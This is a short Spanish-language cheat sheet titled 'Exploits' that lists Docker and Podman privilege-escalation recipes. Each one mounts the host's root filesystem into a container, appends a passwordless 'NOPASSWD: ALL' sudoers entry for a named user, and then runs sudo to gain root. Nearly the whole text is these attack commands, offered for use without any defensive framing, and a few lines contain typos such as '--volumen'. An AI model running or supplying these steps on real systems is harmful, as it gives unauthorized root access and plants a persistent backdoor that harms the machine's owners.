Exploits

## Docker Elevacion de privilegios
[Link sudoers](https://www.tecmint.com/run-sudo-command-without-password-linux/)

### Docker Elevacion de privilegios (ubuntu)

docker run -it -v /:/host bash
docker run --interactive --tty --volumen /:/host bash

# echo "bett0 ALL=(All) NOPASSWD:ALL" > /host/etc/sudoers.d/test

$sudo bash
$sudo -i


### Docker Elevacion de privilegios (-Fedora)
podman run --interactive --tty --volumen /:/host --privileged bash
# echo "bett0 ALL=(All) NOPASSWD:ALL" >> /host/etc/sudoers.d/test

#Docker Elevacion de privilegios (Debian)
FROM debian:wheezy
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME [ $WORKDIR ]
WORKDIR $WORKDIR

docker build -t maquina .

docker run -v /:/privesc -it maquina /bin/bash

# cat /privesc/etc/sudoers

# echo "bett0 ALL=(ALL) NOPASSWD: ALL" >> /privesc/etc/sudoers

$sudo bash
$sudo -i

#Docker Elevacion de privilegios (Debian)
docker run -it --rm -v /:/mnt ubuntu:16.04
# cat /mnt/etc/sudoers
# echo "bett0 ALL=(ALL) NOPASSWD: ALL" >> /mnt/etc/sudoers

$sudo bash
$sudo -i
